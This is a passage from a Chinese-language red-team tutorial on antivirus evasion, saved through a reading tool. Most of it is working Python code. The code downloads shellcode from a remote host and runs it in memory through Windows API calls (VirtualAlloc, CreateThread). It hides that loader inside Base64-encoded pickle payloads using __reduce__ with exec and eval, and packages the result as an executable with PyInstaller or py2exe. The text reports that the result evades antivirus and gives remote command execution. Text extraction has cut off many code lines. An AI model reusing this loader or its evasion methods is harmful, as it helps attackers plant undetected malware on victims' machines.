ctypes.c_int(0),
ctypes.c_int(0),
ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_in
这样我们的可执⾏程序便与 进⾏了分离，直
Shellcode
接运⾏ ⽂件可以上线并正常调⽤命令。
Python
反序列化
但是这个时候如果我们通过 将我们的程序
pyinstaller
打包成可执⾏程序，我们会发现⽕绒仍然对其进⾏了查
杀。
这是因为我们使⽤的加载器本身关键语句已经被检测，因
此我们需要对其进⾏进⼀步处理从⽽绕过静态查杀，我们
绕过的⽅式可以通过上⽂说过的混淆、编码、加密等⽅式
对代码进⾏处理，然后进⾏调⽤执⾏。但是像执⾏命令的
、 等函数特征⽐较明显，所以我们对它也
exec eval
需要进⼀步处理，⽽同其它语⾔⼀样， 也有序
Python
列化的功能，官⽅库⾥提供了 的库⽤于
pickle/cPickle
序列化和反序列化， 可以序列化 的任
pickle python
何数据结构，包括⼀个类，⼀个对象。
import pickle
class A(object):
a = 1
b = 2
def run(self):
print(self.a,self.b)
print(pickle.dumps(A()))
如果之前了解过 反序列化带来的安全问
Python Pickle
题相关内容，我们就可以知道如果这⾥的 函数时
run()
⾃动执⾏的我们就可以通过反序列化过程来进⾏⼀个调⽤
过程，与 中的 类似， 中也有
PHP __wakeup Python
类似的⽅法可以使其在被反序列化的时候执⾏，这⾥以
为例。
__reduce__
import pickle
class A(object):
a = 1
b = 2
def __reduce__(self):
return (print, (self.a+self.b,))
print(pickle.dumps(A()))
接下来我们就可以通过 的 来反序列化
pickle loads
并⾃动执⾏。
import pickle
ret = b'\x80\x03cbuiltins\nprint\nq\x00K\x03\x85q\x01R
pickle.loads(ret)
我们可以看到我们已经将我们的 ⾃动输出了（这
a+b
⾥也可以提示我们， 的 参数如果可以
pickle loads
被控制，我们就可以进⾏利⽤）。但是我们可以看到，从
代码中我们还是可以看到调⽤的关键函数名称，我们这⾥
可以对其进⾏混淆、编码操作，依旧以 编码为
Base64
例，我们序列化代码如下：
import pickle
import base64
class A(object):
a = 1
b = 2
def __reduce__(self):
return (print, (self.a+self.b,))
ret = pickle.dumps(A())
ret_base64 = base64.b64encode(ret)
print(ret_base64)
接下来我们只需要进⾏反序列化调⽤之前先进⾏解码操作
即可。
import pickle
import base64
ret = b'gANjYnVpbHRpbnMKcHJpbnQKcQBLA4VxAVJxAi4='
ret_decode = base64.b64decode(ret)
pickle.loads(ret_decode)
例如我们刚才的获取 的代码就可以通过序列
Shellcode
化以及 编码进⾏处理。
Base64
import pickle
import base64
import urllib.request,codecs
class A(object):
shellcode = urllib.request.urlopen('http://192.168
shellcode = base64.b64decode(shellcode)
shellcode =codecs.escape_decode(shellcode)[0]
def __reduce__(self):
return (bytearray, (self.shellcode,))
ret = pickle.dumps(A())
ret_base64 = base64.b64encode(ret)
print(ret_base64)
之后我们按照上⽂中的代码进⾏解码以及反序列化操作即
可。
import ctypes,urllib.request,base64,codecs,pickle
ret = b'gANjYnVpbHRpbnMKYnl0ZWFycmF5CnEAQn4DAAD8SIPk8O
shellcode = pickle.loads(base64.b64decode(ret))
print(repr(shellcode))
如上所示，我们已经在代码中⽆法看到相应的
的特征，但是这⾥有⼀个问题就是后⾯
urllib.request
我们有⼀些申请内存的操作，但是会遇到⼀些序列化闭包
的问题，这⾥我们可以使⽤ 函数来继续实现。
eval()
eval() 函数⽤来执⾏⼀个字符串表达式，并返回表达式的值。
例如我们想实现⼀个启动计算器的程序，我们⾸先⽣成还
是按上⽂序列化并进⾏编码。
import pickle
import base64
import os
class A(object):
def __reduce__(self):
return(eval,("os.system('calc.exe')",))
ret = pickle.dumps(A())
ret_base64 = base64.b64encode(ret)
print(ret_base64)
接下来进⾏反序列化和解码操作。
import pickle
import base64
import os
ret = b'gANjYnVpbHRpbnMKZXZhbApxAFgVAAAAb3Muc3lzdGVtKC
ret_decode = base64.b64decode(ret)
pickle.loads(ret_decode)
但是 在执⾏多⾏的时候会有缩进问题，如果使
eval()
⽤这种⽅式我们需要将加载器的代码每⼀⾏都单独执⾏，
代码可以查看参考链接 中的代码，我们这⾥为了避
5
免这⼀问题，使⽤
exec()
exec 执⾏储存在字符串或⽂件中的Python语句，相⽐于 eval，exec可
这样，我们就可以通过我们的例如异或、编码等混淆⽅
式，绕过杀软的检测，了解了以上内容，我们就可以进⾏
我们的免杀测试了，我们将我们上⽂中加载器代码利⽤
进⾏序列化并且进⾏编码。
exec()
import pickle
import base64
shellcode = """
import ctypes,urllib.request,codecs,base64
shellcode = urllib.request.urlopen('http://192.168.177
shellcode = base64.b64decode(shellcode)
shellcode =codecs.escape_decode(shellcode)[0]
shellcode = bytearray(shellcode)
# 设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c
# 申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int
# 放⼊shellcode
buf = (ctypes.c_char * len(shellcode)).from_buffer(she
ctypes.windll.kernel32.RtlMoveMemory(
ctypes.c_uint64(ptr),
buf,
ctypes.c_int(len(shellcode))
)
# 创建⼀个线程从shellcode防⽌位置⾸地址开始执⾏
handle = ctypes.windll.kernel32.CreateThread(
ctypes.c_int(0),
ctypes.c_int(0),
ctypes.c_uint64(ptr),
ctypes.c_int(0),
ctypes.c_int(0),
ctypes.pointer(ctypes.c_int(0))
)
# 等待上⾯创建的线程运⾏完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_in
class A(object):
def __reduce__(self):
return(exec,(shellcode,))
ret = pickle.dumps(A())
ret_base64 = base64.b64encode(ret)
print(ret_base64)
ret_decode = base64.b64decode(ret_base64)
之后我们就可以进⾏解码以及反序列化操作。
import base64,pickle
shellcode = b'gANjYnVpbHRpbnMKZXhlYwpxAFhfBAAACmltcG9y
pickle.loads(base64.b64decode(shellcode))
从代码层⾯来讲，杀软视⻆的代码仅能看到是⼀段正常的
解码以及反序列化的脚本⽂件，也就达到了我
Base64
们 的⽬的，运⾏脚本我们可正常上线以及执⾏
Bypass
命令。
打包成可执⾏程序
上⽂我们构建了我们的 ⽂件，但是利⽤起来需
Python
要⽬标环境⽀持 以及相应的库⽂件⽀持，因此
Python
我们可以将我们的 脚本打包成可执⾏程序来解
Python
决这些环境问题，打包⽅法有很多，例如
pyinstaller
或者 ，具体安装⽅法这⾥不在赘述， 这⾥我们
py2exe
使⽤不同的打包程序，最后免杀的效果也不太⼀样，部分
杀软对打包程序本身就加⼊了特征检测。
Pyinstaller
例如我们使⽤ 进⾏打包上述 ，
pyinsataller evil.py
⽬标靶机⽆ 及相应的库环境，正常上线并可执
Python
⾏命令。
pyinstaller --noconsole --onefile evil.py -i 8.ico
检测结果如下：
这⾥后续我⼜进⾏了测试，部分杀软对 打
Pyinstaller
包的程序检测较为敏感，即使是仅打包类似于仅仅
这种代码也会触发相同的检测结果。
print(1)
Py2exe
例如我们使⽤ 进⾏打包上述 ，⽬标
py2exe evil.py
靶机⽆ 及相应的库环境，正常上线并可执⾏命
Python
令。
from distutils.core import setup
import py2exe
setup(
options={
'py2exe': {
'optimize': 2,
'bundle_files': 1,
'compressed': True,
},
},
windows=[{"script": "evil.py", "icon_resources": [
zipfile=None,
)
使⽤如下命令进⾏打包。
python setup.py py2exe
这⾥需要注意的是，如果使⽤ 进⾏打包，我们
py2exe
中要将所有⽤到的包（包括我们编码中的代
evil.py
码）写在⽂件开头，即：
import base64,pickle,ctypes,urllib.request,codecs
shellcode = b'gANjYnVpbHRpbnMKZXhlYwpxAFhfBAAACmltcG9y
pickle.loads(base64.b64decode(shellcode))
否则⽣成的程序会闪退，⽆法正常上线。
检测结果如下：
打造⾃动化免杀平台
根据上⽂我们介绍过的内容，相信你也可以组合代码构造
⼀个⾃动化免杀平台，这样在之后的测试以及红队项⽬上
就可以快⼈⼀步，旗开得胜，这⾥主要思路上⽂均已展
开，后⽂不再赘述。
后记
在本次研究过程中，参考了很多师傅的资料与分享，总结
了⼀下思路，其中有⼀些问题还需要解决， 语
Python
⾔作为胶⽔语⾔，理解起来⽐较⽅便，因此我们这⾥也是
⽤ 举了⼀个例⼦，但是迎⾯⽽来的也有⼀些问
Python
题，例如⽣成的可执⾏程序体积较⼤、 环境以
Python
及相应包的导⼊问题、形如 本身已经被部
Pyinstaller
分杀软标记特征等，希望⼤家可以了解其中的思路与技巧
后举⼀反三，收获更多的技巧与知识~
参考链接：
全⽂完
本⽂由 简悦 SimpRead (http://ksria.com/simpread) 优化，⽤以
提升阅读体验
使⽤了 全新的简悦词法分析引擎 beta，点击查看
(http://ksria.com/simpread/docs/#/词法分析引擎)详细说明